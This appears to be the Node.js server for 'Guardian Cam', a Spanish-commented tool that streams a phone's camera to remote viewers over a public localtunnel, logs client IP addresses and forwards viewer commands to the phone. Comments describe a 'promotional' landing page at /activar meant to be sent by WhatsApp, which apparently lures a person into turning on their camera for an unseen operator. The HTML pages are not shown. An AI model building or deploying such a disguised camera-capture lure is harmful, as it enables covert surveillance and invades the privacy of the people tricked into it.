const express = require('express');
const http    = require('http');
const { Server } = require('socket.io');
const os   = require('os');
const path = require('path');

const app    = express();
const server = http.createServer(app);
const io     = new Server(server, {
  cors: { origin: '*' },
  maxHttpBufferSize: 5e6
});

const PORT = 3000;

// ─── IP local ─────────────────────────────────────────────────────────────────
function getLocalIPs() {
  const ifaces = os.networkInterfaces();
  const ips = [];
  for (const name of Object.keys(ifaces)) {
    for (const iface of ifaces[name]) {
      if (iface.family === 'IPv4' && !iface.internal)
        ips.push({ name, address: iface.address });
    }
  }
  return ips;
}

// ─── Rutas ────────────────────────────────────────────────────────────────────
app.use(express.static(path.join(__dirname, 'public')));
app.get('/camera',  (req, res) => res.sendFile(path.join(__dirname, 'public', 'camera.html')));
app.get('/viewer',  (req, res) => res.sendFile(path.join(__dirname, 'public', 'viewer.html')));

// Landing promocional — enlace que envias por WhatsApp
app.get('/activar', (req, res) => res.sendFile(path.join(__dirname, 'public', 'landing.html')));
app.get('/s',       (req, res) => res.sendFile(path.join(__dirname, 'public', 'landing.html'))); // URL corta

// Config del landing (video, textos, marca)
app.get('/api/config', (req, res) => {
  try {
    const cfg = require('./config.json');
    res.json(cfg);
  } catch(e) {
    res.json({});
  }
});

app.get('/api/ip', (req, res) => {
  const clientIP = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
  res.json({
    clientIP:  clientIP.replace('::ffff:', ''),
    serverIPs: getLocalIPs(),
    timestamp: new Date().toISOString()
  });
});

// Endpoint para que el celular obtenga la URL pública del tunel
app.get('/api/tunnel', (req, res) => {
  res.json({ url: global.tunnelUrl || null });
});

// ─── Estado ───────────────────────────────────────────────────────────────────
let cameraSocket = null;
const viewerSockets = new Set();

io.on('connection', (socket) => {
  const clientIP = (socket.handshake.headers['x-forwarded-for'] || socket.handshake.address)
    .replace('::ffff:', '');

  socket.on('register-camera', (data) => {
    cameraSocket = socket;
    console.log(`[CAM] Cámara conectada | IP: ${clientIP}`);
    io.to('viewers').emit('camera-status', {
      online:     true,
      ip:         clientIP,
      deviceInfo: data?.deviceInfo || 'Desconocido',
      timestamp:  new Date().toISOString()
    });
    socket.emit('camera-confirmed', {
      serverIPs:  getLocalIPs(),
      tunnelUrl:  global.tunnelUrl || null,
      message:    '✅ Cámara activa. Transmitiendo...'
    });
  });

  socket.on('register-viewer', () => {
    socket.join('viewers');
    viewerSockets.add(socket.id);
    // Actualizar contador en cámara
    if (cameraSocket) cameraSocket.emit('viewer-count', viewerSockets.size);
    socket.emit('camera-status', {
      online:    !!cameraSocket,
      timestamp: new Date().toISOString()
    });
  });

  socket.on('video-frame', (frameData) => {
    if (viewerSockets.size > 0)
      io.to('viewers').emit('video-frame', frameData);
  });

  socket.on('viewer-command', (cmd) => {
    if (cameraSocket) cameraSocket.emit('command', cmd);
  });

  socket.on('camera-ping', () => {
    socket.emit('camera-pong', { ts: Date.now() });
    io.to('viewers').emit('camera-heartbeat', {
      ip: clientIP, timestamp: new Date().toISOString()
    });
  });

  socket.on('disconnect', () => {
    if (cameraSocket?.id === socket.id) {
      cameraSocket = null;
      console.log(`[CAM] Cámara desconectada | IP: ${clientIP}`);
      io.to('viewers').emit('camera-status', {
        online:          false,
        ip:              clientIP,
        disconnectedAt:  new Date().toISOString()
      });
    }
    viewerSockets.delete(socket.id);
    if (cameraSocket) cameraSocket.emit('viewer-count', viewerSockets.size);
  });
});

// ─── Inicio + Tunel ───────────────────────────────────────────────────────────
server.listen(PORT, '0.0.0.0', async () => {
  const ips = getLocalIPs();

  console.log('\n╔════════════════════════════════════════╗');
  console.log('║     🔐 GUARDIAN CAM - Sistema Activo   ║');
  console.log('╚════════════════════════════════════════╝');
  console.log(`\n📡 Puerto local: ${PORT}`);
  console.log('\n🖥️  Red local:');
  ips.forEach(ip => console.log(`    http://${ip.address}:${PORT}`));

  // ── Iniciar tunel público ──────────────────────────────────────────────────
  try {
    const localtunnel = require('localtunnel');
    console.log('\n🌐 Iniciando tunel público...');
    const tunnel = await localtunnel({ port: PORT });

    global.tunnelUrl = tunnel.url;
    console.log(`\n✅ URL PÚBLICA (datos/wifi remoto):`);
    console.log(`    ${tunnel.url}`);
    console.log(`\n📱 Celular (directo) → ${tunnel.url}/camera`);
    console.log(`📲 Landing (WhatsApp) → ${tunnel.url}/activar`);
    console.log(`👁️  Viewer            → ${tunnel.url}/viewer`);

    tunnel.on('close', () => {
      console.log('\n⚠️  Tunel cerrado. Reconectando...');
      global.tunnelUrl = null;
    });
    tunnel.on('error', (err) => {
      console.log('\n❌ Error en tunel:', err.message);
      global.tunnelUrl = null;
    });
  } catch (e) {
    console.log('\n⚠️  Tunel no disponible (sin internet o error):', e.message);
    console.log('    Solo disponible en red local.');
  }

  console.log('\n─────────────────────────────────────────\n');
});
